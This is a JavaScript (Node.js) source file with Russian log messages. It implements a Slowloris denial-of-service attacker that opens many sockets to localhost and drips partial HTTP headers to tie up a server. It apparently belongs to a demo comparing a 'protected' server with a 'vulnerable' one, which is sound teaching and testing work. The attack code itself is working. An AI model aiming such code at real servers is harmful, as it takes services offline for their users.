const net = require('net');
const log = require('../utils/logger');

class SlowlorisAttacker {
    constructor(targetPort = 8080) {
        this.targetPort = targetPort;
        this.sockets = [];
        this.activeCount = 0;
        this.totalConnections = 0;
        this.rejectedCount = 0;
    }

    startAttack(count = 20, delay = 1000) {
        const type = this.targetPort === 8080 ? 'ЗАЩИЩЕННЫЙ' : 'УЯЗВИМЫЙ';
        log.section(`SLOWLORIS АТАКА НА ${type} СЕРВЕР`);
        log.attack(`Порт: ${this.targetPort}, соединений: ${count}`);
        
        this.activeCount = 0;
        this.totalConnections = 0;
        this.rejectedCount = 0;
        this.sockets = [];
        
        for (let i = 0; i < count; i++) {
            setTimeout(() => {
                this.createConnection(i);
            }, i * 200);
        }
        
        setInterval(() => {
            log.attack(`Статус: активно ${this.activeCount}, всего создано ${this.totalConnections}, отклонено ${this.rejectedCount}`);
        }, 3000);
    }
    
    createConnection(id) {
        this.totalConnections++;
        
        const socket = net.createConnection(this.targetPort, 'localhost', () => {
            this.activeCount++;
            this.sockets.push(socket);
            log.attack(`[${id}] СОЕДИНЕНИЕ УСТАНОВЛЕНО (активных: ${this.activeCount})`);

            socket.write('GET / HTTP/1.1\r\n');
            socket.write('Host: localhost\r\n');
            
            let headerCount = 0;
            const headerInterval = setInterval(() => {
                if (socket.destroyed) {
                    clearInterval(headerInterval);
                    return;
                }
                socket.write(`X-Slow-Header-${headerCount}: ${'x'.repeat(100)}\r\n`);
                headerCount++;
            }, 1000);
            
            socket.headerInterval = headerInterval;
        });
        
        socket.on('error', (err) => {
            if (err.code === 'ECONNRESET') {
                this.rejectedCount++;
                if (this.activeCount > 0) this.activeCount--;
                log.attack(`[${id}] СОЕДИНЕНИЕ СБРОШЕНО (ЗАЩИТА)`);
            }
        });
        
        socket.on('close', () => {
            if (socket.headerInterval) clearInterval(socket.headerInterval);
            if (this.activeCount > 0) this.activeCount--;
            log.attack(`[${id}] СОЕДИНЕНИЕ ЗАКРЫТО (активных: ${this.activeCount})`);
            
            const index = this.sockets.indexOf(socket);
            if (index > -1) this.sockets.splice(index, 1);
        });
    }
    
    stopAttack() {
        log.attack(`🛑 Закрываю ${this.sockets.length} соединений...`);
        this.sockets.forEach(s => {
            if (s.headerInterval) clearInterval(s.headerInterval);
            s.destroy();
        });
        this.sockets = [];
        this.activeCount = 0;
        log.attack(`🛑 Атака остановлена`);
    }
}

if (require.main === module) {
    const port = process.argv[2] ? parseInt(process.argv[2]) : 8080;
    const attacker = new SlowlorisAttacker(port);
    attacker.startAttack(20, 1000);
    
    process.on('SIGINT', () => {
        attacker.stopAttack();
        process.exit();
    });
}

module.exports = SlowlorisAttacker;